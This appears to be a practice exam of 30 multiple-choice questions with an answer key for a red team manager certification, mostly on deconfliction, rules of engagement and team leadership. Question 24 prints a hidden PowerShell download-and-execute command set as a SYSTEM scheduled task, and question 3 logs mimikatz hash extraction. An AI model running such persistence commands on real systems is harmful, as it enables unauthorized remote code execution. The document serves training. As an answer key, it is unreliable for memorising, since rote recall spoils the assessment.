<table width="100%">
  <tr>
    <td align="center" valign="middle" width="50%">
      <p align="center"><img src="https://pub-6a9f8dede1194a7786cba69e7dcdad9f.r2.dev/certifications/CREST/CREST%20Certified%20Red%20Team%20Manager%20(CCRTM)" width="50%"></p>
    </td>
    <td align="center" valign="middle" width="50%">
      <h1>Certified Red Team Manager</h1>
    </td>
  </tr>
</table>

## 📑 Table of Contents

- [Communication, Deconfliction, and Professionalism](#communication-deconfliction-and-professionalism) (3 questions)
- [Defensive Engagement and Blue Team Integration](#defensive-engagement-and-blue-team-integration) (4 questions)
- [Governance, Risk, and Compliance (GRC) for Red Teams](#governance-risk-and-compliance-grc-for-red-teams) (3 questions)
- [Red Team Management and Leadership](#red-team-management-and-leadership) (8 questions)
- [Technical Attack Lifecycle Management](#technical-attack-lifecycle-management) (6 questions)
- [Threat Intelligence and Adversary Emulation](#threat-intelligence-and-adversary-emulation) (6 questions)

## 📋 Exam Information

| Field | Value |
|-------|-------|
| Total Questions | 30 |
| Level | Foundation |
| Exported At | 2026-08-04T06:27:21.489Z |
| Domains | 6 |

## 📊 Domain Distribution

| Domain | Questions |
|--------|-----------|
| Communication, Deconfliction, and Professionalism | 3 |
| Defensive Engagement and Blue Team Integration | 4 |
| Governance, Risk, and Compliance (GRC) for Red Teams | 3 |
| Red Team Management and Leadership | 8 |
| Technical Attack Lifecycle Management | 6 |
| Threat Intelligence and Adversary Emulation | 6 |

---

### **Communication, Deconfliction, and Professionalism**

### 1. What is the primary role of the Red Team Manager during crisis communication?

- [ ] **A)** Lead the technical investigation
- [ ] **B)** Central communication node
- [ ] **C)** Directly contact law enforcement
- [ ] **D)** Blame the responsible team member

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> The RTM acts as the coordinator for controlled information release and stakeholder communication.
 
 
</details>

### 2. Which two elements are essential for a deconfliction procedure?

- [ ] **A)** Pre-defined escalation matrix
- [ ] **B)** Out-of-band communication channel
- [ ] **C)** Daily status meeting
- [ ] **D)** Email distribution list

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> Deconfliction relies on a clear escalation path and a dedicated real-time channel.
 
 
</details>

### 3. Based on the code block, which report section contains this evidence?

```text
14:23:45 - Executed mimikatz on DC01 - Success
14:24:12 - Extracted hashes - Saved to exfil.txt
```

- [ ] **A)** Executive Summary
- [ ] **B)** Technical Annex
- [ ] **C)** Attack Narrative
- [ ] **D)** Recommendations

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> Raw command logs and outputs are stored in the Technical Annex for reproducibility.
 
 
</details>


---

### **Defensive Engagement and Blue Team Integration**

### 4. What is the primary goal of deconfliction between Red and Blue teams?

- [ ] **A)** Hide red team activities from the SOC
- [ ] **B)** Notify the SOC of authorized simulations
- [ ] **C)** Increase competition between teams
- [ ] **D)** Reduce the red team's workload

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> Deconfliction is a transparency process that prevents false alarms by informing the SOC about authorized red team traffic.
 
 
</details>

### 5. Which two actions are essential for effective Red-Blue collaboration?

- [ ] **A)** Bidirectional knowledge transfer
- [ ] **B)** Red team dominance over operations
- [ ] **C)** Shared metrics and KPI alignment
- [ ] **D)** Keeping TTPs secret from the blue team

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, C**
 
> 💡  **Explanation** 
> 
> Effective collaboration requires two-way knowledge exchange and aligned performance metrics to improve overall security.
 
 
</details>

### 6. Based on the code block, what does the function primarily support during a purple team exercise?

```python
def is_whitelisted(ip):
    whitelist = ['10.0.0.1', '192.168.1.100']
    return ip in whitelist
```

- [ ] **A)** Distinguish authorized traffic from threats
- [ ] **B)** Block all unknown network connections
- [ ] **C)** Encrypt all internal communications
- [ ] **D)** Perform automated vulnerability scanning

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The whitelist function helps deconflict red team traffic, preventing false positives during purple team exercises.
 
 
</details>

### 7. What is the first step in a purple team engagement?

- [ ] **A)** Execute the attack scenario
- [ ] **B)** Define scope and rules of engagement
- [ ] **C)** Analyze detection logs
- [ ] **D)** Patch all discovered vulnerabilities

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> The first step is planning: defining the scope and rules of engagement to align objectives and prevent operational harm.
 
 
</details>


---

### **Governance, Risk, and Compliance (GRC) for Red Teams**

### 8. During a red team engagement, the team discovers personal data in a database that was previously marked as out-of-scope. What is the first action the red team manager should take?

- [ ] **A)** Halt access and notify the client’s Data Protection Officer (DPO)
- [ ] **B)** Continue testing and document the data later
- [ ] **C)** Isolate the database and proceed with the original plan
- [ ] **D)** Ignore the data because it is out of scope

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> According to GDPR Article 33, any personal data breach, including accidental access, must be reported. The red team must stop and notify the DPO immediately to assess notification requirements.
 
 
</details>

### 9. Which two of the following statements correctly describe PCI DSS requirements for red team testing?

- [ ] **A)** Use synthetic or test PANs when verifying CDE segmentation
- [ ] **B)** Obtain written authorization before any testing that targets the cardholder data environment
- [ ] **C)** Conduct a full breach of the CDE to prove vulnerabilities exist
- [ ] **D)** Ignore incident response procedures because it is a controlled test

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> PCI DSS requires the use of non-real card data for testing (Req 11.3) and explicit written authorization (Req 11.3.1). Full breaches or ignoring incident response violate PCI requirements.
 
 
</details>

### 10. In the Rules of Engagement excerpt below, which essential clause is missing based on the CCRTM best practices?

```text
```text
Rules of Engagement – Scope:
- IP ranges: 10.0.0.0/8
- Techniques: network scanning, phishing, physical social engineering
- Data handling: all data encrypted at rest and destroyed within 30 days
- Communication: daily reports to security team, emergency contact via phone
```
```

- [ ] **A)** Rules of Disengagement
- [ ] **B)** Attack vector limitations
- [ ] **C)** Data handling procedures
- [ ] **D)** Communication protocols

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> RoE must specify when and how to stop (disengagement triggers). The snippet includes scope, attack vector limits, data handling, and communication, but lacks disengagement rules.
 
 
</details>


---

### **Red Team Management and Leadership**

### 11. What is the initial step in defining red team objectives?

- [ ] **A)** Engage key stakeholders
- [ ] **B)** Select exploitation tools
- [ ] **C)** Launch phishing campaigns
- [ ] **D)** Write the final report

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Engaging stakeholders ensures objectives align with business risk and legal constraints.
 
 
</details>

### 12. Which documents are essential for defining red team scope? (Select two)

- [ ] **A)** Rules of Engagement
- [ ] **B)** Risk Register
- [ ] **C)** Firewall Logs
- [ ] **D)** Vulnerability Scan Results

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> The RoE defines legal boundaries and the risk register maps objectives to business risks.
 
 
</details>

### 13. What does the following snippet define in a red team operation?

```javascript
if (system_crashed) { abort_operation(); }
```

- [ ] **A)** A stop condition
- [ ] **B)** A privilege escalation technique
- [ ] **C)** A data exfiltration method
- [ ] **D)** A phishing template

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The snippet shows an abort condition (if system crashes, abort) which is a stop condition in RoE.
 
 
</details>

### 14. Who is responsible for defining the red team's success criteria?

- [ ] **A)** Red Team Manager
- [ ] **B)** Blue Team Lead
- [ ] **C)** System Administrator
- [ ] **D)** External Auditor

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The Red Team Manager defines objectives and success criteria aligned to business risk.
 
 
</details>

### 15. Which factors should be considered when building a high-performance red team? (Select two)

- [ ] **A)** Skill matrix and targeted recruitment
- [ ] **B)** Continuous training and certification pathway
- [ ] **C)** Purchasing the most expensive tools
- [ ] **D)** Maximizing number of engagements per quarter

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> Skill gaps and professional development are foundational; expensive tools or high frequency do not guarantee performance.
 
 
</details>

### 16. What does the following code represent in red team resource planning?

```json
{
  "network_pivot": "advanced",
  "web_exploit": "intermediate",
  "social_engineering": "expert"
}
```

- [ ] **A)** Skill mapping matrix
- [ ] **B)** Daily stand-up agenda
- [ ] **C)** Budget spreadsheet
- [ ] **D)** After-action review template

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The code defines a structured skill mapping with required proficiency levels, representing team capability planning.
 
 
</details>

### 17. What is the primary purpose of deconfliction in red team operations?

- [ ] **A)** Avoid alert fatigue and false positives
- [ ] **B)** Increase the stealth of red team activities
- [ ] **C)** Reduce the cost of infrastructure
- [ ] **D)** Speed up the reconnaissance phase

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Deconfliction prevents blue team from mistaking red team activity for a real incident.
 
 
</details>

### 18. Which are acceptable methods to motivate a red team? (Select two)

- [ ] **A)** Provide autonomy in tool selection
- [ ] **B)** Link tasks to a broader mission
- [ ] **C)** Offer bonuses for zero-detection campaigns
- [ ] **D)** Assign all operators to a single attack vector

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> Autonomy and purpose drive intrinsic motivation; financial bonuses may encourage unethical behaviour.
 
 
</details>


---

### **Technical Attack Lifecycle Management**

### 19. According to the CREST Certified Red Team Manager (CCRTM) context, what is the definition of an APT simulation?

- [ ] **A)** A highly structured, objective-driven offensive security exercise that mimics the TTPs of a specific APT over an extended period.
- [ ] **B)** A one-time vulnerability assessment focused on identifying exploitable weaknesses.
- [ ] **C)** A continuous automated scanning process for compliance validation.
- [ ] **D)** A penetration test that emphasizes speed over stealth.

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> An APT simulation is a structured, objective-driven exercise that emulates a specific threat actor's TTPs over an extended period, testing detection and response rather than just vulnerability discovery.
 
 
</details>

### 20. Which of the following are key concepts in Technical Attack Lifecycle Management as described in the CCRTM playbook? (Select all that apply.)

- [ ] **A)** Threat Actor Profiling
- [ ] **B)** Infrastructure Lifecycle Management
- [ ] **C)** Phishing Campaign Execution
- [ ] **D)** Metrics and Reporting for Stakeholders

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, D**
 
> 💡  **Explanation** 
> 
> Key concepts include Threat Actor Profiling, Infrastructure Lifecycle Management, and Metrics and Reporting. Phishing Campaign Execution is a tactical activity, not a management concept.
 
 
</details>

### 21. Review the following document snippet. What type of document is this?

```json
{
  "scope": "Not to include production database servers",
  "exclusions": ["Customer-facing web applications"],
  "time_window": "09:00-17:00 Mon-Fri",
  "communication_channel": "Encrypted email to SOC manager"
}
```

- [ ] **A)** Rules of Engagement (RoE)
- [ ] **B)** Threat Actor Profile
- [ ] **C)** Exfiltration Plan
- [ ] **D)** Incident Response Plan

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The snippet defines scope, exclusions, time windows, and communication channels, which are typical components of the Rules of Engagement (RoE).
 
 
</details>

### 22. What is the primary purpose of threat actor profiling in an APT simulation?

- [ ] **A)** To map a real-world APT group's known TTPs and align them with the organization's threat landscape
- [ ] **B)** To assign blame to a specific nation-state for the simulation
- [ ] **C)** To create a generic attacker profile that covers all possible threats
- [ ] **D)** To choose the most advanced tools available

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> Threat actor profiling involves selecting a real-world APT group and mapping their TTPs to ensure the simulation is realistic and relevant to the organization's risks.
 
 
</details>

### 23. Which of the following are responsibilities of the Red Team Manager concerning infrastructure lifecycle management? (Select all that apply.)

- [ ] **A)** Planning setup, tear-down, and rotation of C2 infrastructure
- [ ] **B)** Ensuring certificates and domains are managed properly
- [ ] **C)** Manually deploying all redirectors and payloads
- [ ] **D)** Approving the budget for cloud instances

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B**
 
> 💡  **Explanation** 
> 
> The manager plans the infrastructure lifecycle including setup, rotation, and tear-down, and oversees certificate and domain management. Actual deployment is done by operators.
 
 
</details>

### 24. Examine the command in the code block. Which phase of the multi-stage attack chain does this represent?

```powershell
schtasks /create /tn "Updater" /tr "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.10.10.10/a''))'" /sc onlogon /ru SYSTEM
```

- [ ] **A)** Initial Access
- [ ] **B)** Persistence
- [ ] **C)** Lateral Movement
- [ ] **D)** Exfiltration

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> The command creates a scheduled task that runs on user logon, which is a persistence mechanism designed to maintain access.
 
 
</details>


---

### **Threat Intelligence and Adversary Emulation**

### 25. Who is accountable for integrating threat intelligence into red team operations?

- [ ] **A)** Threat Intelligence Analyst
- [ ] **B)** Red Team Manager
- [ ] **C)** Blue Team Lead
- [ ] **D)** Engagement Owner

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> Per the document, the red team manager is always accountable for integration, even if others execute tasks.
 
 
</details>

### 26. Which of the following are valid sources of threat intelligence for red team operations? (Select all that apply)

- [ ] **A)** Open-source intelligence (OSINT)
- [ ] **B)** Commercial vendor reports
- [ ] **C)** Internal threat hunting data
- [ ] **D)** Only classified intelligence feeds

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, C**
 
> 💡  **Explanation** 
> 
> The document states that OSINT, commercial, and internal sources are valid when properly analyzed, and not all intelligence needs to be classified.
 
 
</details>

### 27. Based on the code block above, what does T1566.001 represent in the emulation plan?

```plaintext
Procedure: Send email with PDF macro
Technique: T1566.001
Tactic: Initial Access
```

- [ ] **A)** Indicator of Compromise
- [ ] **B)** MITRE ATT&CK Technique
- [ ] **C)** Rules of Engagement
- [ ] **D)** Threat Actor Name

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: B**
 
> 💡  **Explanation** 
> 
> T1566.001 is a MITRE ATT&CK technique ID for Spearphishing Attachment, used to map adversary behavior.
 
 
</details>

### 28. What is the primary purpose of the Cyber Kill Chain framework in red team scenario design?

- [ ] **A)** Sequencing the phases of an attack
- [ ] **B)** Cataloging all known adversary techniques
- [ ] **C)** Predicting attacker's next move
- [ ] **D)** Storing indicators of compromise

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> The Cyber Kill Chain provides a time-ordered flow of attack phases, from reconnaissance to actions on objectives.
 
 
</details>

### 29. Which of the following frameworks are explicitly mentioned as complementary to MITRE ATT&CK for emulation planning? (Select all that apply)

- [ ] **A)** Cyber Kill Chain
- [ ] **B)** Diamond Model
- [ ] **C)** OODA loop
- [ ] **D)** NIST Cybersecurity Framework

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A, B, C**
 
> 💡  **Explanation** 
> 
> The document mentions Cyber Kill Chain, Diamond Model, and OODA loop as complementary frameworks.
 
 
</details>

### 30. The output shown in the code block is an example of which red team management process?

```plaintext
Intelligence Gap Report:
- Gap: Lack of details on adversary's custom dropper
- Impact: Cannot emulate initial access
- Action: Task CTI team with further research
```

- [ ] **A)** Feedback loop
- [ ] **B)** Rules of Engagement
- [ ] **C)** Scenario playbook
- [ ] **D)** Detection gap analysis

<details>
<summary> 🔍 Reveal Answer</summary>
   
#### **✅ Correct Answer: A**
 
> 💡  **Explanation** 
> 
> This feedback loop identifies intelligence gaps and communicates them to the client's threat intelligence team as per the document.
 
 
</details>
